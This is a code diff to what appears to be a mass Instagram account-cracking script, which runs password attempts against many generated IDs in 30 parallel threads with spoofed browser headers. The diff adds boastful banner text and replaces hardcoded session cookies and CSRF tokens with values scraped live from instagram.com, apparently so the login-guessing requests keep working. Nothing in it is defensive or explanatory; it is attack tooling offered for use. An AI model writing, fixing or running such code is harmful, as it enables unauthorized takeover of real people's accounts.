@@ -92,8 +92,8 @@ def random_number():
     with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
         total_idz = str(len(idz))
-        print(f"\033[1;96m ")
-        print()
+        print(f"\033[1;96m KING IS ALWAYS KING")
+        print(f"\033[1;96m SOME RESPECT")
         linex()
         print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
         print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
@@ -125,12 +125,13 @@ def crack(uid, pww, total_idz):
             session = requests.Session()
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            free_fb = session.get(f'https://www.instagram.com').text
             cookies = {
-                'csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
+                'csrftoken': re.search('name="csrftoken" value="(.*?)"', str(free_fb)).group(1),
+                'mid': re.search('name="mid" value="(.*?)"', str(free_fb)).group(1),
+                'ig_did': re.search('name="ig_did" value="(.*?)"', str(free_fb)).group(1),
                 'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
+                'datr': re.search('name="datr" value="(.*?)"', str(free_fb)).group(1),
                 'ps_l': '1',
                 'ps_n': '1',
                 'wd': '885x773',}
@@ -159,7 +160,7 @@ def crack(uid, pww, total_idz):
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
                 'x-asbd-id': '129477',
-                'x-csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
+                'x-csrftoken': re.search('name="csrftoken" value="(.*?)"', str(free_fb)).group(1),
                 'x-ig-app-id': '936619743392459',
                 'x-ig-www-claim': '0',
                 'x-instagram-ajax': '1015767958',
